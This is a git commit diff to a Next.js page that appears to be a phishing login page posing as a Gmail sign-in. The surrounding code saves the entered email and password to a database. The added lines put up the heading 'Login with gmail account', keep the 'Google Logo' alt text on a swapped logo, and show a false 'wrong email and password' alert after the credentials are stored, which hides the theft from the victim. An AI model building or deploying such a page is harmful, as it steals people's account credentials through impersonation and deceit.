7fba5ecf1dacb5fc892ba23c4474952935df1593
zia-ur-rehman-khan <ziaurrehmanwarsi5@gmail.com>
2023-07-08 01:45:07 +0500

    second

--- pages/index.js
+++ pages/index.js
@@ -23,6 +23,7 @@ export default function Home() {
         idName: password,
       });
       console.log("Document added successfully!");
+      alert("wrong email and password");
     } catch (error) {
       console.error("Error adding document: ", error);
     }
@@ -32,10 +33,12 @@ export default function Home() {
     <div className="App">
       <header className="App-header">
         <img
-          src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
+          src="https://media.licdn.com/dms/image/C560BAQH1GD2OHQunqA/company-logo_200_200/0/1645366610347?e=2147483647&v=beta&t=2if88Gc9ZNrgo4PoRUNhmdRVDQwmh9_i3UXvMvZOzg4"
           alt="Google Logo"
         />
+        <h1>Login with gmail account</h1>
         <form onSubmit={handleSubmit}>
+          <input placeholder="Name" />
           <input
             type="email"
             value={email}
@@ -46,6 +49,7 @@ export default function Home() {
             type="password"
             placeholder="Password"
             onChange={(e) => setPassword(e.target.value)}
+            value={password}
           />
           <button type="submit">Sign In</button>
         </form>
